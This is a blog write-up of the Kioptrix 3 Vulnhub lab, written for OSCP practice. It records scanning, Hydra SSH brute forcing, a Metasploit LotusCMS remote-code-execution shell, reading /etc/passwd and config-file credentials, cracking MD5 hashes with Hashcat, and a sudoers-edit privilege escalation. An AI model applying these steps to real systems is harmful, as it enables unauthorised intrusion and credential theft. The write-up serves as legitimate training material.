---
published: true
---
Vulnhub virtual machine; On the path to OSCP this box offered web-application testing with Metasploit, myphpadmin credentials enumeration. Cracking hashes with Hashcat an interesting Priv-Esc which included modifying the sudoer file. 


----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------


# Enumeration


    netdiscover -r 192.168.56.0/24

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550620463329_image.png)


Target: 192.168.56.105

Nmap Scanning

    nmap -sV -sC -oA nmap/kio3 192.168.56.105

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550620567596_image.png)


Navigating to http-server on port 80

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550620689788_image.png)


searchsploit for web application

    searchsploit lingoat

nothing of note turned up.

Checking out the source of web-application

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550620811976_image.png)


*looks to be based off php with the index.php?pagee=index.* 


We have a username `loneferret` who was mentioned on a blog section post. Move to try to bruteforce the ssh with user name.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550621922502_image.png)


Hydra Bruteforcing SSH

    hydra -e nsr -l loneferret -P /usr/share/wordlists/rockyou.txt 192.168.56.105 ssh -t 4

*Important: to use* `*-t 4*` *to not overload the ssh server and risk some passwords not being tested.*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550626098217_image.png)


*brute forcing inside a VM is… well terrible.*

Login page

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550620908445_image.png)


searchsploit LotusCMS

    searchsploit LotusCMS

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550620973843_image.png)


*interesting find*

Viewing how the Metasploit vulnerability works

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550621164831_image.png)


*There is a manipulation of the page parameter from the default page that will be worth investigating.*

# Remote Code Execution

Run metasploit - search lotuscms

    msfdb run

*this will load up the postgres and required files to launch.*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550622525612_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550622683572_image.png)


*We have achieved an easy shell.*

getuid gets users
sysinfo gets system information

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550623213294_image.png)


capture /etc/passwd

    cat /etc/passwd

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550623289348_image.png)


usernames `loneferret` exists as conformation.

Search for any type of config files

    search -d /home/www/kioptrix3.com -f *config*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550623502933_image.png)


Investigating config files

    cat /home/www/kioptrix3.com/gallery/gconfig.php

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550623589054_image.png)


*myphpadmin user/password discovered!*

Login to myphpadmin
navigate to kioptrix3.com/phpmyadmin

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550623701859_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550623748274_image.png)


*access granted*

Navigating through MySQL sever to the Gallery database and discovered `dev_accounts`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550623926024_image.png)


Hashes captured

    dreg: 0d3eccfb887aabd50f243b3f155c0f85
    loneferret: 5badcaf789d3d1d09794d8f021f40f0e

Determining type of hash

    hash-identifier

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550624096240_image.png)


*MD5 looks like a possible match.*

Cracking Hashes with Hashcat
add hashes to hash.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550624471131_image.png)


Launch Hashcat

    hashcat -m 0 -a 0 hash.txt rockyou.txt -o cracked.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550624798144_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550625123167_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550625156643_image.png)


*Hashes successfully cracked.*

    dreg       - 0d3eccfb887aabd50f243b3f155c0f85: starwars
    loneferret - 5badcaf789d3d1d09794d8f021f40f0e: Mast3r


Connect to SSH

    ssh loneferret@kioptix3.com

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550625371491_image.png)


perform a quick sudo -l to determine what we can su-DO. (joke complementary)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550625450327_image.png)


# Priv-Esc

execute sudo ht

    sudo ht

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550625527269_image.png)


playing around till discovered `*ALT+f*` is the command to move around in application

Modifying the sudoers file

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550625773032_image.png)


adding `/bin/sh/` to loneferret && save file

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550625879783_image.png)


# Root

    sudo /bin/sh

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CC08525AD79B48322850AD1912C5BDF4DB72C17615EAC39B7E18253B209C0B95_1550626004346_image.png)


Bring me the root!

-exec
